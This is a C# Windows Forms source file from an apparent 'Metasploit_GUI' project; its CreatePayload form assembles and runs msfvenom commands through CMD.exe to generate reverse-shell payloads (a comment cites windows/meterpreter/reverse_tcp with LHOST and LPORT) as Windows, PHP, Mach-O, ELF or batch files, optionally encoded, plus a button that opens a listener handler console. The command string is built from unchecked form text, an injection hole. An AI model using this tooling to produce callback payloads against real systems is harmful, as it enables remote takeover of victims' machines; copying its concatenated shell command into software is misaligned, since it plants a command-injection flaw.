using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Metasploit_GUI
{
    public partial class CreatePayload : Form
    {
        public string systemroot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
        public string filetype;
        public static string Payload;
        public CreatePayload()
        {
            InitializeComponent();
        }

        private void CreatePayload_Load(object sender, EventArgs e)
        {
            UpdateHost();

            if (!Statics.pythonwrapper_installed)
            {
                groupBox5.Enabled = false;
            }
        }

        public void UpdateHost()
        {
            textBoxLhost.Text = Statics.lhost;
            textBoxLport.Text = Statics.lport;
        }

        static public void UpdateHostFromSpace()
        {
            //new CreatePayload cp; //byg vidrer
            CreatePayload cp = new CreatePayload();
            cp.UpdateHost();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //new Options().Show();
            new Profiles().Show();
            UpdateHost();
        }

        /*
        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }*/

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Payload = comboBoxTargetType.SelectedItem.ToString();
            Console.WriteLine(comboBoxTargetType.SelectedIndex);
            int index = comboBoxTargetType.SelectedIndex;
            if(index == 0 || index == 1)
            {
                labelTargetfiletype.Text = "Windows";
                filetype = "exe";
            }
            if(index == 2)
            {
                labelTargetfiletype.Text = "Webserver: Windows, Linux";
                filetype = "raw";
            }
            if(index == 3)
            {
                labelTargetfiletype.Text = "OS X";
                filetype = "macho";
            }
            if(index == 4)
            {
                labelTargetfiletype.Text = "OS X, Linux";
                filetype = "elf";
            }
            if(index == 5)
            {
                labelTargetfiletype.Text = "Windows";
                filetype = "raw";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
            string strCmdText;
            if (comboBoxEncoders.SelectedItem.ToString() == "none")
            {
                strCmdText = "/C msfvenom -p " + comboBoxTargetType.SelectedItem + " LHOST=" + Statics.lhost + " LPORT=" + Statics.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
            }
            else
            {
                strCmdText = "/C msfvenom -p " + comboBoxTargetType.SelectedItem + " -e " + comboBoxEncoders.SelectedItem + " LHOST=" + Statics.lhost + " LPORT=" + Statics.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
                //strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " -e "+ comboBox2.SelectedItem + " && pause";
            }
            //strCmdText = "/C msfvenom -p "+comboBox1.SelectedItem;
            Console.WriteLine(strCmdText);
            //System.Diagnostics.Process.Start("CMD.exe", strCmdText);
            if (checkBoxPythonWrapper.Checked)
            {
                //strCmdText = strCmdText + " " + systemroot + @"metagui\Extensions\Python-Enwrapper\Enwrapper.exe" + '"' + saveLocation.Text + '"';
                strCmdText = $"{strCmdText} {systemroot}";
                /*
                string strCmdText1;
                strCmdText1 = '"' + saveLocation.Text + '"';
                System.Diagnostics.Process.Start(systemroot + @"metagui\Extensions\Python-Enwrapper\Enwrapper.exe", strCmdText1);
                */
            }
            System.Diagnostics.Process.Start("CMD.exe", strCmdText);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            int index = comboBoxTargetType.SelectedIndex;
            if (index == 0 || index == 1)
            {
                saveFileDialog1.DefaultExt = "exe";
                saveFileDialog1.Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*";
            }
            if (index == 2)
            {
                saveFileDialog1.DefaultExt = "php";
                saveFileDialog1.Filter = "PHP: Hypertext Preprocessor (*.php)|*.php|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
            }
            if (index == 3)
            {
                saveFileDialog1.DefaultExt = "macho";
                saveFileDialog1.Filter = "Mach-O (*.macho)|*.macho|All files (*.*)|*.*";
            }
            if (index == 4)
            {
                saveFileDialog1.DefaultExt = "elf";
                saveFileDialog1.Filter = "Homebrew (*.elf)|*.elf|All files (*.*)|*.*";
            }
            if (index == 5)
            {
                saveFileDialog1.DefaultExt = "bat";
                saveFileDialog1.Filter = "Batch (*.bat)|*.bat|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
            }
            saveFileDialog1.ShowDialog();
            saveLocation.Text = saveFileDialog1.FileName;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            UpdateHost();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            new ConsoleWindow(ConsoleStartOptions.handler).Show();
        }
    }
}
